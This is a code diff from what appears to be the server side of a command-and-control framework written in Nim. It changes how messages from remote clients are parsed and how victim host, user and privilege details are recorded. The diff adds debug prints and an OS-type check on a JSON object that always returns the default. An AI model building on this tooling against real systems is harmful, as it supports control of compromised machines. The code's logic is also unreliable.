@@ -7,23 +7,33 @@ import std/[
   md5
 ]
 
-import pixie
+import tlv
 
-import types, logging, communication, handleResponse, events, tasks
+import types, logging, communication, events, tasks
 
 proc generateClientHash(c: C2Client): string =
   getMD5(
     fmt"{c.ipAddress}{c.hostname}{c.username}{c.osType}{$c.windowsVersionInfo}"
   )
 
-proc processMessage*(client: ref C2Client, response: JsonNode) {.async.} = 
+proc processMessage*(client: ref C2Client, response: string) {.async.} = 
   let server = client.server
 
   if not (client[] in server.clients):
     server.clients.add client[]
+ 
+  let p = initParser()
+  p.setBuffer(cast[seq[byte]](response))
 
-  let error = response["error"].getStr() 
-  let taskId = response["taskId"].getInt(-1) 
+  let taskId = p.extractInt32() 
+  let taskName = p.extractString()
+  let error = p.extractString()
+  let data = p.extractString()
+
+  echo taskId
+  echo taskName
+  echo error
+  echo data
 
   if taskId <= -1:
     await client[].askToIdentify()
@@ -37,13 +47,14 @@ proc processMessage*(client: ref C2Client, response: JsonNode) {.async.} =
       client.server.cli.waitingForOutput = false
       prompt(client.server)
   else: 
-    case response["task"].getStr():
+    case taskName:
     of "identify":
-      client.hostname = response["data"]["hostname"].getStr("")
-      client.username = response["data"]["username"].getStr("")
-      client.isAdmin = response["data"]["isAdmin"].getBool(false)
+      let j = parseJson(data)
+      client.hostname = j["hostname"].getStr("")
+      client.username = j["username"].getStr("")
+      client.isAdmin = j["isAdmin"].getBool(false)
 
-      case response["data"]["osType"].getStr("unknown"):
+      case j.getStr("unknown"):
       of "unknown":
         client.osType = UnknownOS
       of "windows":
@@ -51,30 +62,26 @@ proc processMessage*(client: ref C2Client, response: JsonNode) {.async.} =
       of "linux":
         client.osType = LinuxOS
       client.windowsVersionInfo = WindowsVersionInfo(
-        majorVersion: response["data"]["windowsOsVersionInfo"]["majorVersion"].getInt(),
-        minorVersion: response["data"]["windowsOsVersionInfo"]["minorVersion"].getInt(),
-        buildNumber: response["data"]["windowsOsVersionInfo"]["buildNumber"].getInt()
-      )
-      client.linuxVersionInfo = LinuxVersionInfo(
-        kernelVersion: response["data"]["linuxOsVersionInfo"]["kernelVersion"].getStr(),
+        majorVersion: j["windowsOsVersionInfo"]["majorVersion"].getInt(),
+        minorVersion: j["windowsOsVersionInfo"]["minorVersion"].getInt(),
+        buildNumber: j["windowsOsVersionInfo"]["buildNumber"].getInt()
       )
       client.hash = client[].generateClientHash()
-      client.isAdmin = response["data"]["isAdmin"].getBool(false)
-      client.pid = response["data"]["pid"].getInt(0)
-      client.pname = response["data"]["pname"].getStr("")
-      client.isAdmin = response["data"]["isAdmin"].getBool()
-      client.tokenInformation = TokenInformation(
-        integrityLevel: TokenIntegrityLevel(
-          sid: response["data"]["ownIntegrity"].getStr("")
-        )
-      )
+      client.isAdmin = j["isAdmin"].getBool(false)
+      client.pid = j["pid"].getInt(0)
+      client.pname = j["pname"].getStr("")
+      client.isAdmin = j["isAdmin"].getBool()
+
       if not client.loaded:
         client.loaded = true
         onClientConnected(client[])
         cConnected client[]
-      handleResponse(task, response)
     of "output":
       infoLog $client[] & " completed task " & task.action
-      handleResponse(task, response)
+
+    task.output = TaskOutput(
+      error: error,
+      data: data
+    )
 
     task.markAsCompleted()
